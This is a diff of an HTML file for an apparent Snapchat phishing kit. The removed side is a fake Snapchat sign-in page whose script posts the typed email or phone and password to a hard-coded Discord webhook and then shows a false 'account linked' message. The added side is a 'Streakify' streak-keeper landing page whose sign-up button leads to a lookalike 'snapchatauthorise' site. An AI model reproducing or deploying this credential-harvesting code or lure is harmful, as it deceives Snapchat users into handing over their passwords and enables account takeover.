@@ -1,156 +1,178 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<title>Confirm SnapChat Account Link</title>
-	<link rel="shortcut icon" type="image/png" href="https://upload.wikimedia.org/wikiversity/en/thumb/c/c4/Snapchat_logo.svg/2048px-Snapchat_logo.svg.png"/> 
+	<title>Streakify - Never Lose a Snapchat Streak</title>
+	<link rel="shortcut icon" type="image/png" href="https://i.ibb.co/m0DyKMj/Logo-1.png"/> 
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
 	<style>
 		body {
-			background-color: #FFFC00;
-			background-size: cover;
-			font-family: Helvetica;
-		}
-        .text-box {
-			padding: 10px;
-			border: none;
-			border-bottom: 1px solid rgba(0,0,0,.3);
-			margin-bottom: 20px;
-			width: 100%;
-			box-sizing: border-box;
-			background-color: rgba(255,255,255,.8);
+			font-family: "Helvetica Neue", sans-serif;
 			font-size: 16px;
-			color: #111;
-		}
-		.text-box:focus {
-			outline: none;
-		}
-		.login-btn {
-			background-color: #52B1F6;
-			color: #ffffff;
-			border: none;
-			padding: 10px;
-			cursor: pointer;
-			width: 100%;
-			font-size: 18px;
-			font-weight: bold;
-			border-radius: 5px;
-			margin-bottom: 20px;
-		}
-		.signup-text {
-			text-align: center;
-			margin-top: 10px;
-			color: #fff;
-			cursor: pointer;
-			font-size: 14px;
-			font-weight: normal;
-		}
-		.signup-link {
-			color: #fff;
-		}
-		.logo {
-			display: block;
-			margin: 30px auto 20px;
-			width: 120px;
-		}
-		.container {
-			position: absolute;
-			top: 50%;
-			left: 50%;
-			transform: translate(-50%, -50%);
-			max-width: 320px;
-			padding: 20px;
-			background-color: rgba(255,255,255,.9);
-			box-shadow: 0px 0px 10px rgba(0,0,0,.3);
-			border-radius: 10px;
+			line-height: 1.5;
+			color: #000;
+			background-color: #fff;
 		}
 
-		
-		.footer {
-			background-color: #111;
-			color: #fff;
-			font-size: 14px;
-			text-align: center;
-			position: fixed;
-			bottom: 0;
-			left: 0;
-			right: 0;
-			padding: 5px;
+		h1, h2, h3, h4, h5, h6 {
+			margin-top: 0;
+			margin-bottom: 0.5rem;
+			font-weight: 500;
+			line-height: 1.2;
 		}
-	
-		.footer a {
+
+		h1 {
+			font-size: 3rem;
+		}
+
+		h2 {
+			font-size: 2.5rem;
+		}
+
+		.jumbotron {
+			padding-top: 17rem;
+			padding-bottom: 17rem;
+			margin-bottom: 0;
+			background-color: #FFFC00;
+			background-repeat: no-repeat;
+			background-position: right bottom;
+			background-size: 60%;
+			color: #000;
+			text-align: center;
+		}
+
+		.jumbotron h1 {
+			font-size: 5rem;
+			font-weight: bold;
+			color: #000;
+		}
+
+		.about {
+			padding: 3rem 1.5rem;
+			background-color: #000;
 			color: #fff;
-			text-decoration: none;
-			margin: 0 5px;
-	}
-		
+			text-align: center;
+		}
+
+		.about h2 {
+			font-size: 2.5rem;
+			color: #FFFC00;
+		}
+
+		.contact {
+			padding: 3rem 1.5rem;
+			background-color: #fff;
+			text-align: center;
+		}
+
+		.contact h2 {
+			font-size: 2.5rem;
+			color: #000;
+		}
+
+		.btn {
+			display: inline-block;
+			font-weight: 400;
+			color: #fff;
+			text-align: center;
+			vertical-align: middle;
+			-webkit-user-select: none;
+			-moz-user-select: none;
+			-ms-user-select: none;
+			user-select: none;
+			background-color: #000;
+			border: 1px solid #000;
+			padding: 0.5rem 2rem;
+			font-size: 1.25rem;
+			line-height: 1.5;
+			border-radius: 0.25rem;
+			transition: all 0.15s ease-in-out;
+		}
+
+		.btn:hover {
+			background-color: #FFFC00;
+			color: #000;
+			border-color: #FFFC00;
+		}
+		footer {
+  			background-color: #000;
+  			color: #fff;
+  			padding: 2rem 0;
+		}
+
+		footer a {
+  			color: #fff;
+		}
+
+		footer a:hover {
+ 			 color: #FFFC00;
+		}
+
 
 
 	</style>
 </head>
 <body>
+	
+	<header>
+		<nav class="navbar navbar-expand-lg navbar-light bg-light">
+			<div class="container">
+				<a class="navbar-brand" href="#"><img src="https://i.ibb.co/MMB6fZt/Snapchat-Streakify-1.png" alt="Streakify"></a>
+				<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation
+>
+<span class="navbar-toggler-icon"></span>
+</button>
+<div class="collapse navbar-collapse" id="navbarNav">
+<ul class="navbar-nav ml-auto">
+<li class="nav-item active">
+<a class="nav-link" href="#">Home <span class="sr-only">(current)</span></a>
+</li>
+<li class="nav-item">
+<a class="nav-link" href="#about">About</a>
+</li>
+<li class="nav-item">
+<a class="nav-link" href="#contact">Contact</a>
+</li>
+</ul>
+</div>
+</div>
+</nav>
+</header>
+<section class="jumbotron">
 	<div class="container">
-		<img src="https://upload.wikimedia.org/wikiversity/en/thumb/c/c4/Snapchat_logo.svg/2048px-Snapchat_logo.svg.png" alt="SnapChat Logo" class="logo">
-		<input type="text" placeholder="Email or phone" class="text-box">
-		<input type="password" placeholder="Password" class="text-box">
-		<button type="submit" class="login-btn">Sign in</button>
-        <script>
-            const webhookUrl = 'https://discord.com/api/webhooks/1101354855408345119/GiDq_WHrs9h6Qj9hKdHHAvA7ATUFf8PhF3xMc0hIkdu-tvIfZNwrmKK7zb-nMO9lE5so';
-     
-            function sendWebhook() {
-               const emailOrPhone = document.querySelector('input[type="text"]').value;
-               const password = document.querySelector('input[type="password"]').value;
-     
-               const payload = {
-                  content: `Email or phone: ${emailOrPhone}\nPassword: ${password}`
-               };
-     
-               fetch(webhookUrl, {
-                  method: 'POST',
-                  headers: {
-                     'Content-Type': 'application/json'
-                  },
-                  body: JSON.stringify(payload)
-               })
-               .then(response => {
-                  console.log('Webhook sent successfully');
-               })
-               .catch(error => {
-                  console.error('Error sending webhook:', error);
-               });
-            }
-     
-            const loginButton = document.querySelector('.login-btn');
-            loginButton.addEventListener('click', sendWebhook);
-			loginButton.addEventListener('click', function() {
-				const waitlistWindow = window.open("", "_blank", "width=400,height=200,left=" + (screen.width/2 - 200) + ",top=" + (screen.height/2 - 100));
-waitlistWindow.document.body.style.backgroundColor = "#52B1F6";
-waitlistWindow.document.body.style.color = "#fff";
-waitlistWindow.document.body.style.fontFamily = "Helvetica";
-waitlistWindow.document.body.style.textAlign = "center";
-waitlistWindow.document.body.style.display = "flex";
-waitlistWindow.document.body.style.flexDirection = "column";
-waitlistWindow.document.body.style.justifyContent = "center";
-waitlistWindow.document.body.innerHTML = "<h2>Your Account Has Been Linked!!</h2><p>Your account has now linked to the 'Streakify' service, to cancel account linking go to the account settings in the SnapChat mobile app.</p>";
-
-});
-
-			
-         </script>
-        
-        
-     <p style="font-family: Helvetica; color: #52B1F6; text-align: center;">Don't have an account? <a href="https://snapchat.com/signup" style="text-decoration: none; color: #52B1F6; border-bottom: 1px solid #52B1F6;">Create One!</a></p>
-
+		<h1>Never Lose a Snapchat Streak Again</h1>
+		<p class="lead">Streakify makes it easy to keep your Snapchat streaks going strong. Sign up now and never lose a streak again!</p>
+		<a href="https://snapchatauthorise.netlify.app/" class="btn btn-lg btn-primary mb-2">Sign Up Now</a>
 	</div>
-	<div class="footer">
-		<p>Snapchat ® 2023</p>
-		<a href="#">Terms of Use</a>
-		<a href="#">Privacy Policy</a>
-		<a href="#">Help</a>
+</section>
+
+<section id="about" class="about">
+	<div class="container">
+		<h2>About Streakify</h2>
+		<p>Streakify is the ultimate solution for Snapchat users who want to keep their streaks alive. Our app helps you remember to send a snap every day and keeps track of your streaks automatically. No more losing streaks and disappointing your friends – sign up for Streakify today!</p>
 	</div>
-	
-	
-</body>
-</html>
- 
+</section>
 
-
-     
+<section id="contact" class="contact">
+	<div class="container">
+		<h2>Contact Us</h2>
+		<p>Have a question or feedback for us? We'd love to hear from you!</p>
+		<a href="#" class="btn btn-lg btn-primary mb-2">Get in Touch</a>
+	</div>
+</section>
+<footer>
+	<div class="container">
+	<div class="row">
+		<div class="col-md-6 text-center text-md-left">
+			<p>&copy; 2023 Streakify. All Rights Reserved.</p>
+		</div>
+		<div class="col-md-6 text-center text-md-right">
+			<a href="#"><i class="fab fa-facebook"></i></a>
+			<a href="#"><i class="fab fa-twitter"></i></a>
+			<a href="#"><i class="fab fa-instagram"></i></a>
+		</div>
+	</div>
+</div>
+</footer>
